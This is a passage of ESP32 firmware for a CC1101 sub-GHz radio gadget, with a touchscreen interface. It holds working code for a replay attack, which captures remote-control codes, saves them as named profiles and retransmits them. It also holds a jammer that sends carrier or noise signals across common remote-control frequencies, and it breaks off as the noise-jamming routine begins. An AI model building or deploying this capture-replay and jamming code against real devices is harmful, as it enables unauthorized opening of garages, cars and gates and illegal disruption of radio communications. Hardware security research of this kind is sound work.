  Serial.printf("[CC1101] IOCFG0=0x%02X (need 0x0D), IOCFG2=0x%02X, PKTCTRL0=0x%02X (need 0x32)\n", iocfg0, iocfg2, pktctrl0);
  if (iocfg0 != 0x0D) {
      Serial.println("[CC1101] ERROR: IOCFG0 wrong! Forcing to 0x0D...");
      ELECHOUSE_cc1101.SpiWriteReg(0x02, 0x0D);  // Force async serial data output
      iocfg0 = ELECHOUSE_cc1101.SpiReadReg(0x02);
      Serial.printf("[CC1101] IOCFG0 now=0x%02X\n", iocfg0);
      ELECHOUSE_cc1101.SetRx();  // Re-enter RX mode after register change
      Serial.println("[CC1101] Re-entered RX mode after IOCFG0 fix");
  }

  // DEBUG: Check GDO2 (pin 26) state - this is RX data output in async mode
  Serial.printf("[CC1101] Pin %d (GDO2/RX) current state: %d\n", TX_PIN, digitalRead(TX_PIN));
  Serial.println("========================================\n");

  // CORRECT CONFIG per agent audit:
  // In async serial mode, CC1101 OUTPUTS RX data on GDO2 (pin 26)
  // RCSwitch should RECEIVE from GDO2, TRANSMIT to GDO0
  mySwitch.enableReceive(TX_PIN);   // GDO2 = pin 26 = RX data FROM CC1101
  subghz_receive_active = true;
  mySwitch.enableTransmit(RX_PIN);  // GDO0 = pin 16 = TX data TO CC1101
  Serial.printf("[RCSwitch] RX on GDO2=pin%d, TX on GDO0=pin%d\n", TX_PIN, RX_PIN);
      
  //ELECHOUSE_cc1101.setSpiPin (SCK, MISO, MOSI, CSN);
  //ELECHOUSE_cc1101.setSpiPin (18, 19, 23, 27);

  //ELECHOUSE_cc1101.setGDO(gdo0, gdo2);
  //ELECHOUSE_cc1101.setGDO(26, 16);
  //mySwitch.enableReceive(16); 
  //mySwitch.enableTransmit(26); 
  
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);

  sampling_period = round(1000000*(1.0/FrequencySUB));

  for (int i = 0; i < 32; i++) {
    red[i] = i / 2;
    green[i] = 0;
    blue[i] = i;
  }
  for (int i = 32; i < 64; i++) {
    red[i] = i / 2;
    green[i] = 0;
    blue[i] = 63 - i;
  }
  for (int i = 64; i < 96; i++) {
    red[i] = 31;
    green[i] = (i - 64) * 2;
    blue[i] = 0;        
  }
  for (int i = 96; i < 128; i++) {
    red[i] = 31;
    green[i] = 63;
    blue[i] = i - 96;        
  }
  
   float currentBatteryVoltage = readBatteryVoltage();
   drawStatusBar(currentBatteryVoltage, false);

   // ========== ON-SCREEN CC1101 DIAGNOSTIC ==========
   tft.fillRect(0, 100, 240, 120, TFT_BLACK);
   tft.setTextSize(1);
   tft.setCursor(10, 110);
   tft.setTextColor(TFT_YELLOW);
   tft.println("=== CC1101 DIAGNOSTIC ===");

   tft.setCursor(10, 125);
   if (ELECHOUSE_cc1101.getCC1101()) {
       tft.setTextColor(TFT_GREEN);
       tft.println("CC1101: DETECTED");
   } else {
       tft.setTextColor(TFT_RED);
       tft.println("CC1101: NOT DETECTED!");
   }

   tft.setCursor(10, 140);
   tft.setTextColor(TFT_WHITE);
   tft.printf("Freq Idx: %d", currentFrequencyIndex);

   tft.setCursor(10, 155);
   tft.printf("Freq: %.2f MHz", subghz_frequency_list[currentFrequencyIndex] / 1000000.0);

   tft.setCursor(10, 170);
   int rssiTest = ELECHOUSE_cc1101.getRssi();
   tft.printf("RSSI: %d dBm", rssiTest);

   tft.setCursor(10, 185);
   tft.setTextColor(TFT_CYAN);
   tft.println("Touch to continue...");

   // Wait for touch or 3 seconds
   unsigned long diagStart = millis();
   while (millis() - diagStart < 3000) {
       if (ts.touched()) {
           delay(100);
           break;
       }
       delay(50);
   }
   // ========== END DIAGNOSTIC ==========

   updateDisplay();
   uiDrawn = false;

}

void ReplayAttackLoop() {

    runUI();
    //updateStatusBar();
  
    static unsigned long lastDebounceTime = 0;
    const unsigned long debounceDelay = 200;

    int btnLeftState = pcf.digitalRead(BTN_LEFT);
    int btnRightState = pcf.digitalRead(BTN_RIGHT);
    int btnSelectState = pcf.digitalRead(BTN_UP);
    int btndownState = pcf.digitalRead(BTN_DOWN);
    
    do_sampling();
    delay(10);
    epochSUB++;

    // ========== LIVE DEBUG (bottom of screen) ==========
    static unsigned long lastRssiUpdate = 0;
    static unsigned long gdo2SampleCount = 0;
    static unsigned long gdo2HighCount = 0;
    static unsigned long gdo2TransitionCount = 0;
    static int lastGdo2State = -1;

    // Sample pin 26 (GDO2 - RX data output in async mode)
    int currentPin = digitalRead(TX_PIN);  // GDO2 = pin 26 = RX data FROM CC1101
    gdo2SampleCount++;
    if (currentPin) gdo2HighCount++;
    if (lastGdo2State != -1 && currentPin != lastGdo2State) {
        gdo2TransitionCount++;
    }
    lastGdo2State = currentPin;

    if (millis() - lastRssiUpdate > 500) {
        int liveRssi = ELECHOUSE_cc1101.getRssi();
        byte mode = ELECHOUSE_cc1101.getMode();  // 0=IDLE, 1=TX, 2=RX

        // === UPDATE MAIN DISPLAY RSSI (top area) ===
        // Clear and redraw RSSI in main display area (y=35 + 20 status bar offset)
        tft.fillRect(170, 55, 50, 10, TFT_BLACK);  // Clear old RSSI value
        tft.setCursor(170, 55);
        tft.setTextSize(1);
        if (liveRssi > -50) {
            tft.setTextColor(TFT_GREEN);
        } else if (liveRssi > -70) {
            tft.setTextColor(TFT_YELLOW);
        } else {
            tft.setTextColor(TFT_WHITE);
        }
        tft.printf("%d", liveRssi);

        // === UPDATE DEBUG AREA (bottom of screen) ===
        tft.fillRect(0, 305, 240, 15, TFT_BLACK);
        tft.setCursor(5, 305);
        tft.setTextSize(1);

        // Mode indicator
        tft.setTextColor(mode == 2 ? TFT_GREEN : TFT_RED);
        tft.printf("M:%d ", mode);  // Should be 2 for RX

        // RSSI with color
        if (liveRssi > -50) {
            tft.setTextColor(TFT_GREEN);
        } else if (liveRssi > -70) {
            tft.setTextColor(TFT_YELLOW);
        } else {
            tft.setTextColor(TFT_WHITE);
        }
        tft.printf("R:%d ", liveRssi);

        // Pin 26 (GDO2) state and transition count - RX data in async mode
        tft.setTextColor(gdo2TransitionCount > 0 ? TFT_GREEN : TFT_RED);
        tft.printf("P26:%d T:%lu", currentPin, gdo2TransitionCount);

        // Serial debug with RCSwitch raw values
        Serial.printf("[DEBUG] RSSI=%d GDO2=%d T=%lu avail=%d val=%lu bits=%u\n",
                      liveRssi, currentPin, gdo2TransitionCount,
                      mySwitch.available(), mySwitch.getReceivedValue(), mySwitch.getReceivedBitlength());

        lastRssiUpdate = millis();
    }
    // =====================================================

    if (epochSUB >= tft.width())
      epochSUB = 0;

    // ========================================================================
    // AUTO-SCAN FREQUENCY SWEEP LOGIC
    // ========================================================================
    if (autoScanMode) {
        unsigned long now = millis();

        if (autoScanPaused) {
            // Currently paused on a signal - check if pause time expired
            if (now - autoScanPauseTime >= AUTO_SCAN_PAUSE_MS) {
                autoScanPaused = false;
                // Advance to next frequency
                autoScanIndex = (autoScanIndex + 1) % numFrequenciesReplay;
                autoScanLastChange = now;
                ELECHOUSE_cc1101.setSidle();
                ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanIndex] / 1000000.0);
                ELECHOUSE_cc1101.SetRx();
                updateDisplay();
            }
        } else {
            // Actively scanning - check if dwell time expired
            if (now - autoScanLastChange >= AUTO_SCAN_DWELL_MS) {
                // Check RSSI before moving on
                int rssi = ELECHOUSE_cc1101.getRssi();
                if (rssi > AUTO_SCAN_RSSI_THRESHOLD) {
                    // Signal detected! Pause scanning on this frequency
                    autoScanPaused = true;
                    autoScanPauseTime = now;
                    updateDisplay();  // Update to show paused state
                } else {
                    // No signal - advance to next frequency
                    autoScanIndex = (autoScanIndex + 1) % numFrequenciesReplay;
                    autoScanLastChange = now;
                    ELECHOUSE_cc1101.setSidle();
                    ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanIndex] / 1000000.0);
                    ELECHOUSE_cc1101.SetRx();
                    updateDisplay();
                }
            }
        }
    }
    // ========================================================================

    // Button RIGHT - Frequency UP (toggles AUTO-SCAN at end of list)
    if (btnRightState == LOW && millis() - lastDebounceTime > debounceDelay) {
        if (autoScanMode) {
            // Exit auto-scan, go to first frequency
            autoScanMode = false;
            autoScanPaused = false;
            currentFrequencyIndex = 0;
        } else if (currentFrequencyIndex >= numFrequenciesReplay - 1) {
            // At last frequency - enable AUTO-SCAN
            autoScanMode = true;
            autoScanIndex = 0;
            autoScanLastChange = millis();
            autoScanPaused = false;
        } else {
            currentFrequencyIndex++;
        }
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanMode ? autoScanIndex : currentFrequencyIndex] / 1000000.0);
        ELECHOUSE_cc1101.SetRx();
        EEPROM.put(ADDR_FREQ, currentFrequencyIndex);
        EEPROM.commit();
        updateDisplay();
        lastDebounceTime = millis();
    }

    // Button LEFT - Frequency DOWN (toggles AUTO-SCAN at start of list)
    if (btnLeftState == LOW && millis() - lastDebounceTime > debounceDelay) {
        if (autoScanMode) {
            // Exit auto-scan, go to last frequency
            autoScanMode = false;
            autoScanPaused = false;
            currentFrequencyIndex = numFrequenciesReplay - 1;
        } else if (currentFrequencyIndex <= 0) {
            // At first frequency - enable AUTO-SCAN
            autoScanMode = true;
            autoScanIndex = 0;
            autoScanLastChange = millis();
            autoScanPaused = false;
        } else {
            currentFrequencyIndex--;
        }
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanMode ? autoScanIndex : currentFrequencyIndex] / 1000000.0);
        ELECHOUSE_cc1101.SetRx();
        EEPROM.put(ADDR_FREQ, currentFrequencyIndex);
        EEPROM.commit();
        updateDisplay();
        lastDebounceTime = millis();
    }

    if (mySwitch.available()) { 
        receivedValue = mySwitch.getReceivedValue(); 
        receivedBitLength = mySwitch.getReceivedBitlength(); 
        receivedProtocol = mySwitch.getReceivedProtocol(); 

        EEPROM.put(ADDR_VALUE, receivedValue);
        EEPROM.put(ADDR_BITLEN, receivedBitLength);
        EEPROM.put(ADDR_PROTO, receivedProtocol);
        EEPROM.commit();
        
        updateDisplay();
        mySwitch.resetAvailable(); 
    }

     if (btnSelectState == LOW && receivedValue != 0 && millis() - lastDebounceTime > debounceDelay) {
        sendSignal();
        lastDebounceTime = millis();
    }
     if (pcf.digitalRead(BTN_DOWN) == LOW && millis() - lastDebounceTime > debounceDelay) {
         saveProfile();
         lastDebounceTime = millis();
    }
  } 
}


/*
 * 
 * Saved Profile
 * 
 * 
 */

namespace SavedProfile {

static bool uiDrawn = false;

#define RX_PIN 16         
#define TX_PIN 26        

#define EEPROM_SIZE 1440  // Increased to accommodate larger profiles
#define ADDR_PROFILE_START 1300
#define MAX_NAME_LENGTH 16 // Maximum length for profile name (including null terminator)

#define BTN_UP     6
#define BTN_DOWN   3
#define BTN_LEFT   4
#define BTN_RIGHT  5

#define SCREEN_WIDTH 240 
#define SCREEN_HEIGHT 320 

RCSwitch mySwitch = RCSwitch();

struct Profile {
    uint32_t frequency;
    unsigned long value;
    int bitLength;
    int protocol;
    char name[MAX_NAME_LENGTH]; // Custom name field
};

#define PROFILE_SIZE sizeof(Profile) // Size of the updated Profile struct

int profileCount = 0;
int currentProfileIndex = 0;
int yshift = 40;

void updateDisplay() {
    tft.fillRect(0, 40, 240, 280, TFT_BLACK); // Adjusted to clear only necessary area
    tft.setCursor(5, 5 + yshift);
    tft.setTextColor(TFT_YELLOW);
    tft.print("Saved Profiles");

    if (profileCount == 0) {
        tft.setCursor(10, 35 + yshift);
        tft.setTextColor(TFT_WHITE);
        tft.print("No profiles saved.");
        return;
    }

    Profile selectedProfile;
    int addr = ADDR_PROFILE_START + (currentProfileIndex * PROFILE_SIZE);
    EEPROM.get(addr, selectedProfile);

    if (selectedProfile.value == 0) {
        tft.setCursor(10, 50 + yshift);
        tft.setTextColor(TFT_WHITE);
        tft.print("No valid profile.");
        return;
    }

    tft.setCursor(10, 30 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.printf("Profile %d/%d", currentProfileIndex + 1, profileCount);

    tft.setCursor(10, 50 + yshift);
    tft.setTextColor(TFT_WHITE);
    tft.print("Name: ");
    tft.print(selectedProfile.name);

    tft.setCursor(10, 70 + yshift);
    tft.printf("Freq: %.2f MHz", selectedProfile.frequency / 1000000.0);

    tft.setCursor(10, 90 + yshift);
    tft.printf("Val: %lu", selectedProfile.value);

    tft.setCursor(10, 110 + yshift);
    tft.printf("BitLen: %d", selectedProfile.bitLength);

    tft.setCursor(10, 130 + yshift);
    tft.printf("Protocol: %d", selectedProfile.protocol);
}

void transmitProfile(int index) {
    Profile profileToSend;
    int addr = ADDR_PROFILE_START + (index * PROFILE_SIZE);
    EEPROM.get(addr, profileToSend);

    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.setMHZ(profileToSend.frequency / 1000000.0);

    mySwitch.disableReceive();
    delay(100);
    ELECHOUSE_cc1101.SetTx();

    tft.fillRect(0, 40, 240, 280, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.setTextColor(TFT_WHITE);
    tft.print("Sending ");
    tft.print(profileToSend.name);
    tft.print(" (RMT)...");
    tft.setCursor(10, 50 + yshift);
    tft.print("Value: ");
    tft.print(profileToSend.value);

    // ========================================
    // RMT-BASED TRANSMISSION (Hardware Timing)
    // ========================================
    bool success = false;
    if (profileToSend.protocol >= 1 && profileToSend.protocol < replayat::NUM_RC_PROTOCOLS) {
        success = replayat::rmtReplaySend(profileToSend.protocol, profileToSend.value,
                                          profileToSend.bitLength, 10);
    }

    // Fallback to RCSwitch if RMT fails
    if (!success) {
        Serial.println("[PROFILE-TX] Falling back to RCSwitch");
        mySwitch.enableTransmit(TX_PIN);
        mySwitch.setProtocol(profileToSend.protocol);
        mySwitch.send(profileToSend.value, profileToSend.bitLength);
        mySwitch.disableTransmit();
    }

    delay(500);
    tft.fillRect(0, 40, 240, 280, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.print("Done!");

    ELECHOUSE_cc1101.SetRx();
    delay(100);
    mySwitch.enableReceive(RX_PIN);
    replayat::subghz_receive_active = true;

    delay(500);
    updateDisplay();
}

void loadProfileCount() {
    EEPROM.get(ADDR_PROFILE_START - 4, profileCount);

    if (profileCount < 0 || profileCount > MAX_PROFILES) {
        profileCount = 0;
        EEPROM.put(ADDR_PROFILE_START - 4, profileCount);  
        EEPROM.commit();  
    }
}

void printProfiles() {
    Serial.println("Saved Profiles:");
    for (int i = 0; i < profileCount; i++) {
        Profile savedProfile;
        int addr = ADDR_PROFILE_START + (i * PROFILE_SIZE);
        EEPROM.get(addr, savedProfile);

        if (savedProfile.value != 0) {
            Serial.printf("Profile %d:\n", i + 1);
            Serial.printf("  Name: %s\n", savedProfile.name);
            Serial.printf("  Frequency: %.2f MHz\n", savedProfile.frequency / 1000000.0);
            Serial.printf("  Value: %lu\n", savedProfile.value);
            Serial.printf("  Bit Length: %d\n", savedProfile.bitLength);
            Serial.printf("  Protocol: %d\n", savedProfile.protocol);
            Serial.println("-------------------------");
        }
    }
}

void deleteProfile(int index) {
    if (index >= profileCount || index < 0) return;  

    Profile deletedProfile;
    int addr = ADDR_PROFILE_START + (index * PROFILE_SIZE);
    EEPROM.get(addr, deletedProfile); // Get profile for display

    for (int i = index; i < profileCount - 1; i++) {
        Profile nextProfile;
        int addr = ADDR_PROFILE_START + ((i + 1) * PROFILE_SIZE);
        EEPROM.get(addr, nextProfile);

        addr = ADDR_PROFILE_START + (i * PROFILE_SIZE);
        EEPROM.put(addr, nextProfile);
    }

    Profile emptyProfile = {0, 0, 0, 0, ""};
    EEPROM.put(ADDR_PROFILE_START + ((profileCount - 1) * PROFILE_SIZE), emptyProfile);

    profileCount--;
    EEPROM.put(ADDR_PROFILE_START - 4, profileCount);  
    EEPROM.commit();

    if (profileCount == 0) {
        currentProfileIndex = 0;
    } else if (currentProfileIndex >= profileCount) {
        currentProfileIndex = profileCount - 1;
    }

    tft.fillRect(0, 40, 240, 280, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.setTextColor(TFT_WHITE);
    tft.print("Removed: ");
    tft.print(deletedProfile.name);

    delay(1000);
    updateDisplay();
}

void runUI() {
    #define STATUS_BAR_Y_OFFSET 20
    #define STATUS_BAR_HEIGHT 16
    #define ICON_SIZE 16
    #define ICON_NUM 5
    
    static int iconX[ICON_NUM] = {90, 130, 170, 210, 10};
    static int iconY = STATUS_BAR_Y_OFFSET;
    
    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_sort_down_minus,    
        bitmap_icon_sort_up_plus,       
        bitmap_icon_antenna,     
        bitmap_icon_recycle,
        bitmap_icon_go_back // Back icon
    };

    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
        
        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {  
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            } 
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;  
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0: // Next profile
                    if (profileCount > 0) {
                        currentProfileIndex = (currentProfileIndex + 1) % profileCount;
                        updateDisplay();
                    }
                    break;
                case 1: // Previous profile
                    if (profileCount > 0) {
                        currentProfileIndex = (currentProfileIndex - 1 + profileCount) % profileCount;
                        updateDisplay();
                    }
                    break;
                case 2: // Transmit profile
                    if (profileCount > 0) {
                        transmitProfile(currentProfileIndex);
                    }
                    break;
                case 3: // Delete profile
                    if (profileCount > 0) {
                        deleteProfile(currentProfileIndex);
                    }
                    break;
                case 4: // Back icon (exit to submenu)
                    feature_exit_requested = true;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;  

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        if (ts.touched() && feature_active) {
            TS_Point p = ts.getPoint();
            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
            int y = ::map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);

            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {
                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                            animationState = 1;
                            activeIcon = i;
                            lastAnimationTime = millis();
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void saveSetup() {
    Serial.begin(115200);

    // NRF24 cleanup - release pins and SPI bus before CC1101 init
    pinMode(17, OUTPUT);
    digitalWrite(17, HIGH);        // Deselect NRF24 CSN
    SPI.end();                      // Release SPI bus
    delay(10);
    pinMode(16, INPUT);            // Reconfigure pin 16 for CC1101 GDO0/RX
    Serial.println("[SubGHz] NRF24 cleanup - SPI released for CC1101");

    EEPROM.begin(EEPROM_SIZE);
    loadProfileCount();
    printProfiles();

    pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
    pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
    pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
    pcf.pinMode(BTN_UP, INPUT_PULLUP);

    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE);

    setupTouchscreen();

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    uiDrawn = false;

    // Configure both GDO pins BEFORE Init()
    // GDO0 (pin 16) = OUTPUT (TX data TO CC1101)
    // GDO2 (pin 26) = INPUT (RX data FROM CC1101 in async mode)
    ELECHOUSE_cc1101.setGDO(RX_PIN, TX_PIN);
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setCCMode(0);       // Async/RCSwitch mode (IOCFG0=0x0D)
    ELECHOUSE_cc1101.setModulation(2);   // ASK/OOK
    ELECHOUSE_cc1101.SetRx();

    // In async serial mode, CC1101 OUTPUTS RX data on GDO2 (pin 26)
    mySwitch.enableReceive(TX_PIN);      // GDO2 = pin 26 = RX data FROM CC1101
    replayat::subghz_receive_active = true;
    mySwitch.enableTransmit(RX_PIN);     // GDO0 = pin 16 = TX data TO CC1101

    updateDisplay();
}

void saveLoop() {
    runUI();
    
    static unsigned long lastDebounceTime = 0;
    const unsigned long debounceDelay = 200;

    int btnLeftState = pcf.digitalRead(BTN_LEFT);
    int btnRightState = pcf.digitalRead(BTN_RIGHT);
    int btnSelectState = pcf.digitalRead(BTN_DOWN);
    int btnUpState = pcf.digitalRead(BTN_UP);

    if (profileCount > 0) {
        if (btnRightState == LOW && millis() - lastDebounceTime > debounceDelay) {
            currentProfileIndex = (currentProfileIndex + 1) % profileCount;
            updateDisplay();
            lastDebounceTime = millis();
        }

        if (btnLeftState == LOW && millis() - lastDebounceTime > debounceDelay) {
            currentProfileIndex = (currentProfileIndex - 1 + profileCount) % profileCount;
            updateDisplay();
            lastDebounceTime = millis();
        }

        if (btnSelectState == LOW && millis() - lastDebounceTime > debounceDelay) {
            transmitProfile(currentProfileIndex);
            lastDebounceTime = millis();
        }

        if (btnUpState == LOW && millis() - lastDebounceTime > debounceDelay) {
            deleteProfile(currentProfileIndex);  
            lastDebounceTime = millis();
        }
    } else {
        //tft.fillRect(0, 40, 240, 280, TFT_BLACK);
        tft.setCursor(10, 50 + yshift);
        tft.setTextColor(TFT_WHITE);
        tft.print("No profiles to select.");
    }
}

}


/*
 * 
 * subGHz jammer
 * 
 * 
 */

namespace subjammer {

static bool uiDrawn = false;

static unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 200;

#define TX_PIN 26

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_DOWN   3
#define BTN_UP     6

// RMT noise jamming parameters
#define RMT_NOISE_BATCH    64       // Symbols per RMT transmission
#define NOISE_MIN_PULSE    10       // Minimum pulse width (microseconds)
#define NOISE_MAX_PULSE    200      // Maximum pulse width (microseconds)

bool jammingRunning = false;
bool continuousMode = true;
bool autoMode = false;     
unsigned long lastSweepTime = 0;
const unsigned long sweepInterval = 1000; 

static const uint32_t subghz_frequency_list[] = {
    300000000, 303875000, 304250000, 310000000, 315000000, 318000000,  
    390000000, 418000000, 433075000, 433420000, 433920000, 434420000, 
    434775000, 438900000, 868350000, 915000000, 925000000
};
const int numFrequencies = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);
int currentFrequencyIndex = 4; 
float targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;


void updateDisplay() {

    int yshift = 20;
    
    tft.fillRect(0, 40, 240, 80, TFT_BLACK); 
    tft.drawLine(0, 79, 235, 79, TFT_WHITE);

    // Frequency section
    tft.setTextSize(1);
    tft.setCursor(5, 22 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Freq:");
    tft.setCursor(40, 22 + yshift);
    if (autoMode) {
        tft.setTextColor(ORANGE);
        tft.print("Auto: ");
        tft.setTextColor(TFT_WHITE);
        tft.print(targetFrequency, 1);
        // Progress bar
        int progress = map(currentFrequencyIndex, 0, numFrequencies - 1, 0, 240);
        tft.fillRect(0, 60 + yshift, 240, 4, TFT_BLACK);
        tft.fillRect(0, 60 + yshift, progress, 4, ORANGE);
        // Blinking sweep indicator
        if (jammingRunning && millis() % 1000 < 500) {
            tft.fillCircle(220, 22 + yshift, 2, TFT_GREEN);
        } else {
            tft.fillCircle(220, 22 + yshift, 2, TFT_BLACK);  // Clear when off
        }
    } else {
        tft.setTextColor(TFT_WHITE);
        tft.print(targetFrequency, 2);
        tft.print(" MHz");
    }

    // Mode section
    tft.setCursor(130, 22 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Mode:");
    tft.setCursor(165, 22 + yshift);
    tft.setTextColor(continuousMode ? TFT_GREEN : TFT_YELLOW);
    tft.print(continuousMode ? "Cont" : "Noise");

    // Status section
    tft.setCursor(5, 42 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Status:");
    tft.setCursor(50, 42 + yshift);
    if (jammingRunning) {
        tft.setTextColor(TFT_RED);
        tft.print("Jamming");

    } else {
        tft.setTextColor(TFT_GREEN);
        tft.print("Idle   "); 
    }
}


void runUI() {
    #define SCREEN_WIDTH  240
    #define SCREENHEIGHT 320
    #define STATUS_BAR_Y_OFFSET 20
    #define STATUS_BAR_HEIGHT 16
    #define ICON_SIZE 16
    #define ICON_NUM 6 
    
    static int iconX[ICON_NUM] = {50, 90, 130, 170, 210, 10}; // Added back icon at x=10
    static int iconY = STATUS_BAR_Y_OFFSET;
    
    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_power,    
        bitmap_icon_antenna,      
        bitmap_icon_random,    
        bitmap_icon_sort_down_minus,
        bitmap_icon_sort_up_plus,
        bitmap_icon_go_back // Added back icon
    };

    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
        
        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {  
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            } 
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;               
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;  
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                  jammingRunning = !jammingRunning;
                    if (jammingRunning) {
                        Serial.println("Jamming started");
                        ELECHOUSE_cc1101.setMHZ(targetFrequency);
                        ELECHOUSE_cc1101.SetTx();
                    } else {
                        Serial.println("Jamming stopped");
                        ELECHOUSE_cc1101.setSidle();
                        digitalWrite(TX_PIN, LOW);
                    }
                    updateDisplay();
                    lastDebounceTime = millis();
                    break;
                case 1: 
                 continuousMode = !continuousMode;
                  Serial.print("Jamming mode: ");
                  Serial.println(continuousMode ? "Continuous Carrier" : "Noise");
                  updateDisplay();
                  lastDebounceTime = millis();
                    break;
                case 2: 
                  autoMode = !autoMode;
                  Serial.print("Frequency mode: ");
                  Serial.println(autoMode ? "Automatic" : "Manual");
                  if (autoMode) {
                      currentFrequencyIndex = 0;
                      targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
                      ELECHOUSE_cc1101.setMHZ(targetFrequency);
                  }
                  updateDisplay();
                  lastDebounceTime = millis();
                    break;
                case 3: 
                  currentFrequencyIndex = (currentFrequencyIndex - 1 + numFrequencies) % numFrequencies;
                  targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
                  ELECHOUSE_cc1101.setMHZ(targetFrequency);
                  Serial.print("Switched to: ");
                  Serial.print(targetFrequency);
                  Serial.println(" MHz");
                  updateDisplay();
                  lastDebounceTime = millis();
                    break;
                 case 4: 
                  currentFrequencyIndex = (currentFrequencyIndex + 1) % numFrequencies;
                  targetFrequency = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
                  ELECHOUSE_cc1101.setMHZ(targetFrequency);
                  Serial.print("Switched to: ");
                  Serial.print(targetFrequency);
                  Serial.println(" MHz");
                  updateDisplay();
                  lastDebounceTime = millis();
                    break;
                case 5: // Back icon action (exit to submenu)
                    feature_exit_requested = true;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();  
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50; 

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        if (ts.touched() && feature_active) { 
            TS_Point p = ts.getPoint();
            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
            int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {
                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                            animationState = 1;
                            activeIcon = i;
                            lastAnimationTime = millis();
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

// ============================================================================
// RMT-BASED NOISE JAMMING - Hardware-timed random pulse generation
